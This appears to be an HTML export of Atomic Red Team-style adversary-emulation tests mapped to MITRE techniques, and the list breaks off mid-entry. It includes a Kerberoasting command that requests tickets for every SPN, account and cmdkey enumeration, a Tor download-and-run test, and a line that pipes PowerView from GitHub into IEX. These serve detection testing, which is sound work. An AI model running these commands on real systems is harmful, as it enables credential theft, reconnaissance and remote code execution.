<li><strong>id</strong>: 902f4ed2-1aba-4133-90f2-cff6d299d6da</li>
<li><strong>name</strong>: Request All Tickets via PowerShell</li>
<li>
<p><strong>description</strong>: The following test will utilize native PowerShell Identity modules to query the domain to extract allthe Service Principal Names. This behavior is typically used during a kerberos or silver ticket attack. 
A successful execution will output the SPNs for the domain in question.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Add-Type -AssemblyName System.IdentityModel<br />
setspn.exe -T #{domain_name} -Q <em>/</em> | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  </p>
</li>
<li>
<p><strong>prereq_command</strong>: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: Write-Host Joining this computer to a domain must be done manually</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1558.003</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 80887bec-5a9b-4efc-a81d-f83eb2eb32ab</li>
<li><strong>name</strong>: Enumerate all accounts on Windows (Local)</li>
<li>
<p><strong>description</strong>: Enumerate all accounts
Upon execution, multiple enumeration commands will be run and their output displayed in the PowerShell session</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: net user
dir c:\Users\
cmdkey.exe /list
net localgroup "Users"
net localgroup</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1087.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: ae4b6361-b5f8-46cb-a3f9-9cf108ccfe7b</li>
<li><strong>name</strong>: Enumerate all accounts via PowerShell (Local)</li>
<li>
<p><strong>description</strong>: Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: net user
get-localuser
get-localgroupmember -group Users
cmdkey.exe /list
ls C:/Users
get-childitem C:\Users\
dir C:\Users\
get-localgroup
net localgroup</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1087.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 5c876daf-db1e-41cf-988d-139a7443ccd4</li>
<li><strong>name</strong>: Get Printer Device List via PowerShell Command</li>
<li>
<p><strong>description</strong>: This test uses PowerShell to list printers on a Windows system, demonstrating a discovery technique attackers might use to 
gather details on connected devices. Using Get-Printer, they can view information on all available printers, identifying 
potential devices for further targeting.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Get-Printer</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1120</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 7b9d85e5-c4ce-4434-8060-d3de83595e69</li>
<li><strong>name</strong>: Tor Proxy Usage - Windows</li>
<li>
<p><strong>description</strong>: This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.
Upon successful execution, the tor proxy will be launched, run for 60 seconds, and then exit. </p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: invoke-expression 'cmd /c start powershell -Command {cmd /c "#{TorExe}"}'
sleep -s 60
stop-process -name "tor" | out-null</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path "#{TorExe}") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Type Directory "PathToAtomicsFolder..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://archive.torproject.org/tor-package-archive/torbrowser/11.0.6/tor-win32-0.4.6.9.zip" -OutFile "PathToAtomicsFolder..\ExternalPayloads\tor.zip"
expand-archive -LiteralPath "PathToAtomicsFolder..\ExternalPayloads\tor.zip" -DestinationPath "PathToAtomicsFolder..\ExternalPayloads\tor"</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1090.003</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 29857f27-a36f-4f7e-8084-4557cd6207ca</li>
<li><strong>name</strong>: Find computers where user has session - Stealth mode (PowerView)</li>
<li><strong>description</strong>: Find existing user session on other computers. Upon execution, information about any sessions discovered will be displayed.</li>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1033</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: dcb6cdee-1fb0-4087-8bf8-88cfd136ba51</li>
<li><strong>name</strong>: User Discovery With Env Vars PowerShell Script</li>
<li><strong>description</strong>: Use the PowerShell environment variables to identify the current logged user.</li>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: [System.Environment]::UserName | Out-File -FilePath .\CurrentactiveUser.txt 
$env:UserName | Out-File -FilePath .\CurrentactiveUser.txt -Append</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Remove-Item -Path .\CurrentactiveUser.txt -Force</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1033</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 1392bd0f-5d5a-429e-81d9-eb9d4d4d5b3b</li>
<li><strong>name</strong>: GetCurrent User with PowerShell Script</li>
<li><strong>description</strong>: Use the PowerShell "GetCurrent" method of the WindowsIdentity .NET class to identify the logged user.</li>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: [System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\CurrentUserObject.txt</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Remove-Item -Path .\CurrentUserObject.txt -Force</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1033</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
